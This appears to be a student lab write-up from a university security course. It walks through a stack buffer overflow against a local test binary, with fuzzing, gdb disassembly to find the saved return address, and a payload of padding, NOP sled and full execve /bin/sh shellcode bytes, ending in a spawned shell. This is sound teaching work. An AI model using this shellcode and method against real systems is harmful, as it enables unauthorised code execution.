# Code Execution without knowing Buff size

#### Goal
We want to exploit a program (gain root console access) using buffer overflow without knowing the buffer size


# Step 1, find the buff size

We actually need to understand where the buff crashes, let's go with an high number to be sure

```bash
➜  code_exec git:(main) ✗ perl -e 'print "A"x600' | ./code_exec_no_size_known
Init Program
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[1]    4258 done                              perl -e 'print "A"x600' | 
       4259 segmentation fault (core dumped)  ./code_exec_no_size_known
➜  code_exec git:(main) ✗ perl -e 'print "A"x600' | ./code_exec_no_size_known
```

We understand that the buff size is 100% lower than 600 bytes


---

Let's now run the script (python, which bruteforce the payload) with MAX set to 600

```bash
➜  code_exec git:(main) ✗ python get_buff_size.py 
Program crashed at input size: 520
Probabile dimensione del buffer: 520
➜  code_exec git:(main) ✗ 
```

We now know the buff size is 500 bytes ish ??

# 2 Find RIP position (x86_64) 


## Dumping program main (gdb disassemble)

```
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
   0x0000000000401050 <+0>:     sub    rsp,0x8
   0x0000000000401054 <+4>:     lea    rdi,[rip+0xfa9]        # 0x402004
   0x000000000040105b <+11>:    call   0x401030 <puts@plt>
   0x0000000000401060 <+16>:    xor    eax,eax
   0x0000000000401062 <+18>:    call   0x401170 <toExploit>
   0x0000000000401067 <+23>:    lea    rdi,[rip+0xfa3]        # 0x402011
   0x000000000040106e <+30>:    call   0x401030 <puts@plt>
   0x0000000000401073 <+35>:    xor    eax,eax
```


## Find RIP Position

We saw by previous instruction calling that there is a print, input from user and another print, the first print is at ```*0x40105b``` then function calling (toExploit) and then the second print, we want to add a breakpoint using gdb after the function execution (toExploit), which is a leave at ```*0x401067```

```bash
Breakpoint 3 at 0x401067
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/colasuonno/Desktop/uni/Sicurezza/CBuffOverflow/code_exec/code_exec_no_size_known 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
Init Program
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 3, 0x0000000000401067 in main ()
(gdb) 
(gdb) 
(gdb) info frame
Stack level 0, frame at 0x7fffffffd830:
 rip = 0x401067 in main; saved rip = 0x7ffff7dc6488
 Arglist at 0x7fffffffd818, args: 
 Locals at 0x7fffffffd818, Previous frame's sp is 0x7fffffffd830
 Saved registers:
  rip at 0x7fffffffd828
(gdb) 
```

We see RIP position at ```0x7fffffffd828```

# 3 Build payload

Payload structure

```
pad + RIP (Overwrite) + NOP + shellcode
```

### Pad

Padding is buff size (actual size, so 520)

### RIP (Overwrite)

It will be actual RIP address + 8 bytes (64bit architecture) 

```
0x7fffffffd828 + 8 = 0x7fffffffd830
```

### NOP

We create NOP Slide since we don't know exactly the shellcode position (100 bytes of ```0x90```)


### Shellcode

Shell code is actually instructions code in HEX to execute, we used (https://shell-storm.org/shellcode/index.html).

In this example I will use

```bash
/bin/sh
```

```c
/*
 * Execute /bin/sh - 27 bytes
 * Dad` <3 baboon
;rdi            0x4005c4 0x4005c4
;rsi            0x7fffffffdf40   0x7fffffffdf40
;rdx            0x0      0x0
;gdb$ x/s $rdi
;0x4005c4:        "/bin/sh"
;gdb$ x/s $rsi
;0x7fffffffdf40:  "\304\005@"
;gdb$ x/32xb $rsi
;0x7fffffffdf40: 0xc4    0x05    0x40    0x00    0x00    0x00    0x00    0x00
;0x7fffffffdf48: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
;0x7fffffffdf50: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
;0x7fffffffdf58: 0x55    0xb4    0xa5    0xf7    0xff    0x7f    0x00    0x00
;
;=> 0x7ffff7aeff20 <execve>:     mov    eax,0x3b
;   0x7ffff7aeff25 <execve+5>:   syscall 
;

main:
    ;mov rbx, 0x68732f6e69622f2f
    ;mov rbx, 0x68732f6e69622fff
    ;shr rbx, 0x8
    ;mov rax, 0xdeadbeefcafe1dea
    ;mov rbx, 0xdeadbeefcafe1dea
    ;mov rcx, 0xdeadbeefcafe1dea
    ;mov rdx, 0xdeadbeefcafe1dea
    xor eax, eax
    mov rbx, 0xFF978CD091969DD1
    neg rbx
    push rbx
    ;mov rdi, rsp
    push rsp
    pop rdi
    cdq
    push rdx
    push rdi
    ;mov rsi, rsp
    push rsp
    pop rsi
    mov al, 0x3b
    syscall
 */

#include <stdio.h>
#include <string.h>

char code[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

int main()
{
    printf("len:%d bytes\n", strlen(code));
    (*(void(*)()) code)();
    return 0;
}

```

So our final payload will be

```AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����  ����������������������������������������������������������������������������������������������������1�H�ѝ��Ќ��H��ST_�RWT^�;```

# Result

```/CBuffOverflow/code_exec/code_exec_no_size_known < <(python exploit.py)
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
Init Program
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
process 17958 is executing new program: /usr/bin/bash
```

We can see /usr/bin/bash